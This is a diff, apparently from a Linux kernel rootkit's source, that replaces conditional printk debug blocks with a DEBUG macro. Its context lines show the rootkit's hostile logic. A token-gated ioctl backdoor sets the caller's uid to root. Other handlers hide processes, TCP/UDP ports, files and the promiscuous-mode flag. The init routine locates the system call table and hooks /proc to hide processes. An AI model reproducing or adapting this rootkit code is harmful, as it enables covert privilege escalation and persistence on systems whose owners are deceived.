@@ -593,9 +593,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
 
     if ( cmd == AUTH_TOKEN )
     {
-        #if __DEBUG__
-        printk("Authenticated, receiving command\n");
-        #endif
+        DEBUG("Authenticated, receiving command\n");
 
         ret = copy_from_user(&args, (void *)arg, sizeof(args));
         if ( ret )
@@ -605,9 +603,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
         {
             /* Upgrade privileges of current process */
             case 0:
-                #if __DEBUG__
-                printk("Elevating privileges of PID %hu\n", current->pid);
-                #endif
+                DEBUG("Elevating privileges of PID %hu\n", current->pid);
 
                 #if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 29)
                 current->uid   = 0;
@@ -634,9 +630,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
                     if ( ret )
                         return 0;
 
-                    #if __DEBUG__
-                    printk("Hiding PID %hu\n", proc_args.pid);
-                    #endif
+                    DEBUG("Hiding PID %hu\n", proc_args.pid);
 
                     hide_proc(proc_args.pid);
                 }
@@ -651,9 +645,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
                     if ( ret )
                         return 0;
 
-                    #if __DEBUG__
-                    printk("Unhiding PID %hu\n", proc_args.pid);
-                    #endif
+                    DEBUG("Unhiding PID %hu\n", proc_args.pid);
 
                     unhide_proc(proc_args.pid);
                 }
@@ -668,9 +660,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
                     if ( ret )
                         return 0;
 
-                    #if __DEBUG__
-                    printk("Hiding TCPv4 port %hu\n", port_args.port);
-                    #endif
+                    DEBUG("Hiding TCPv4 port %hu\n", port_args.port);
 
                     hide_tcp4_port(port_args.port);
                 }
@@ -685,9 +675,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
                     if ( ret )
                         return 0;
 
-                    #if __DEBUG__
-                    printk("Unhiding TCPv4 port %hu\n", port_args.port);
-                    #endif
+                    DEBUG("Unhiding TCPv4 port %hu\n", port_args.port);
 
                     unhide_tcp4_port(port_args.port);
                 }
@@ -702,9 +690,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
                     if ( ret )
                         return 0;
 
-                    #if __DEBUG__
-                    printk("Hiding TCPv6 port %hu\n", port_args.port);
-                    #endif
+                    DEBUG("Hiding TCPv6 port %hu\n", port_args.port);
 
                     hide_tcp6_port(port_args.port);
                 }
@@ -719,9 +705,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
                     if ( ret )
                         return 0;
 
-                    #if __DEBUG__
-                    printk("Unhiding TCPv6 port %hu\n", port_args.port);
-                    #endif
+                    DEBUG("Unhiding TCPv6 port %hu\n", port_args.port);
 
                     unhide_tcp6_port(port_args.port);
                 }
@@ -736,9 +720,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
                     if ( ret )
                         return 0;
 
-                    #if __DEBUG__
-                    printk("Hiding UDPv4 port %hu\n", port_args.port);
-                    #endif
+                    DEBUG("Hiding UDPv4 port %hu\n", port_args.port);
 
                     hide_udp4_port(port_args.port);
                 }
@@ -753,9 +735,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
                     if ( ret )
                         return 0;
 
-                    #if __DEBUG__
-                    printk("Unhiding UDPv4 port %hu\n", port_args.port);
-                    #endif
+                    DEBUG("Unhiding UDPv4 port %hu\n", port_args.port);
 
                     unhide_udp4_port(port_args.port);
                 }
@@ -770,9 +750,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
                     if ( ret )
                         return 0;
 
-                    #if __DEBUG__
-                    printk("Hiding UDPv6 port %hu\n", port_args.port);
-                    #endif
+                    DEBUG("Hiding UDPv6 port %hu\n", port_args.port);
 
                     hide_udp6_port(port_args.port);
                 }
@@ -787,9 +765,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
                     if ( ret )
                         return 0;
 
-                    #if __DEBUG__
-                    printk("Unhiding UDPv6 port %hu\n", port_args.port);
-                    #endif
+                    DEBUG("Unhiding UDPv6 port %hu\n", port_args.port);
 
                     unhide_udp6_port(port_args.port);
                 }
@@ -818,9 +794,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
 
                     name[file_args.namelen+1] = 0;
 
-                    #if __DEBUG__
-                    printk("Hiding file/dir %s\n", name);
-                    #endif
+                    DEBUG("Hiding file/dir %s\n", name);
 
                     hide_file(name);
                 }
@@ -849,9 +823,7 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
 
                     name[file_args.namelen + 1] = 0;
 
-                    #if __DEBUG__
-                    printk("Unhiding file/dir %s\n", name);
-                    #endif
+                    DEBUG("Unhiding file/dir %s\n", name);
 
                     unhide_file(name);
 
@@ -861,18 +833,14 @@ static long n_inet_ioctl ( struct socket *sock, unsigned int cmd, unsigned long 
 
             /* Hide network PROMISC flag */
             case 13:
-                #if __DEBUG__
-                printk("Hiding PROMISC flag\n");
-                #endif
+                DEBUG("Hiding PROMISC flag\n");
 
                 hide_promisc = 1;
                 break;
 
             /* Unhide network PROMISC flag */
             case 14:
-                #if __DEBUG__
-                printk("Unhiding PROMISC flag\n");
-                #endif
+                DEBUG("Unhiding PROMISC flag\n");
 
                 hide_promisc = 0;
                 break;
@@ -901,16 +869,12 @@ static int __init i_solemnly_swear_that_i_am_up_to_no_good ( void )
 
     #if defined(_CONFIG_X86_64_)
     ia32_sys_call_table = find_ia32_sys_call_table();
-        #if __DEBUG__
-    printk("ia32_sys_call_table obtained at %p\n", ia32_sys_call_table);
-        #endif
+    DEBUG("ia32_sys_call_table obtained at %p\n", ia32_sys_call_table);
     #endif
 
     sys_call_table = find_sys_call_table();
 
-    #if __DEBUG__
-    printk("sys_call_table obtained at %p\n", sys_call_table);
-    #endif
+    DEBUG("sys_call_table obtained at %p\n", sys_call_table);
 
     /* Hook /proc for hiding processes */
     o_proc_readdir = get_vfs_readdir("/proc");
